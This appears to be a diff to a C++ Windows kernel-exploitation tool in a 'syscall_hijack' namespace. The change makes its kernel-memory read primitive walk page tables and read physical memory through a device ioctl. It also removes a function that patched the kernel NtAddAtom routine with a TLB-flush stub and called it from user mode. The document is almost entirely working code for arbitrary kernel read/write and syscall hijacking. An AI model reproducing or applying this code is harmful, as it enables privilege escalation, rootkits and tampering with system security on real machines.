@@ -18,7 +18,18 @@ constexpr uint8_t EXPECTED_PROLOGUE[7] = {
 };
 
 bool read_kva(const syscall_hijack::Context& ctx, uint64_t kva, void* dst, size_t size) {
-    return ioctl::read_kernel_virtual(ctx.device, kva, dst, size);
+    uint8_t* out = static_cast<uint8_t*>(dst);
+    while (size) {
+        uint64_t page_off = kva & 0xFFFULL;
+        size_t chunk = std::min<size_t>(size, 0x1000 - page_off);
+        uint64_t phys = 0;
+        if (!pagewalk::va_to_phys(ctx.device, ctx.cr3, kva, phys)) return false;
+        if (!ioctl::read_physical(ctx.device, phys, out, chunk)) return false;
+        kva += chunk;
+        out += chunk;
+        size -= chunk;
+    }
+    return true;
 }
 
 bool write_kva(const syscall_hijack::Context& ctx, uint64_t kva, const void* src, size_t size) {
@@ -298,70 +309,6 @@ bool smoke_test(const Context& ctx, uint64_t kqpc_kva) {
                 monotonic ? "YES  ->  primitive works end-to-end"
                           : "NO   ->  primitive broken (see above)");
     return monotonic;
-}
-
-bool flush_tlb_range(const Context& ctx, uint64_t va_start, size_t size) {
-    uint8_t saved[12] = {};
-    if (!read_kva(ctx, ctx.nt_add_atom_kva, saved, 12)) {
-        std::printf("[!] tlb_flush: read prologue failed\n");
-        return false;
-    }
-
-    if (std::memcmp(saved, EXPECTED_PROLOGUE, 7) != 0 || saved[7] != 0xE8) {
-        std::printf("[!] tlb_flush: prologue mismatch\n");
-        return false;
-    }
-
-    uint8_t stub[12] = {
-        0x0F, 0x01, 0x39,
-        0x33, 0xC0,
-        0xC3,
-        0x90, 0x90, 0x90, 0x90, 0x90, 0x90
-    };
-
-    HANDLE  thread       = GetCurrentThread();
-    HANDLE  process      = GetCurrentProcess();
-    int     old_thr_prio = GetThreadPriority(thread);
-    DWORD   old_prc_cls  = GetPriorityClass(process);
-    DWORD_PTR old_affinity = SetThreadAffinityMask(thread, 1);
-    SetPriorityClass(process, HIGH_PRIORITY_CLASS);
-    SetThreadPriority(thread, THREAD_PRIORITY_TIME_CRITICAL);
-
-    typedef uint64_t (NTAPI *PFN_Raw)(uint64_t, uint64_t, uint64_t, uint64_t);
-    auto user_stub = reinterpret_cast<PFN_Raw>(ctx.ntdll_nt_add_atom_user);
-
-    bool wrote_stub = false;
-    int  flushed    = 0;
-
-    __try {
-        if (write_kva(ctx, ctx.nt_add_atom_kva, stub, 12)) {
-            wrote_stub = true;
-            _mm_mfence();
-
-            uint64_t va_end = (va_start + size + 0xFFF) & ~0xFFFULL;
-            va_start &= ~0xFFFULL;
-            for (uint64_t va = va_start; va < va_end; va += 0x1000) {
-                user_stub(va, 0, 0, 0);
-                ++flushed;
-            }
-            _mm_mfence();
-        } else {
-            std::printf("[!] tlb_flush: stub write failed\n");
-        }
-    }
-    __finally {
-        if (wrote_stub) {
-            write_kva(ctx, ctx.nt_add_atom_kva, saved, 12);
-            _mm_mfence();
-        }
-    }
-
-    SetThreadPriority(thread, old_thr_prio);
-    SetPriorityClass(process, old_prc_cls);
-    if (old_affinity) SetThreadAffinityMask(thread, old_affinity);
-
-    std::printf("[+] TLB flushed: %d pages\n", flushed);
-    return flushed > 0;
 }
 
 } // namespace syscall_hijack
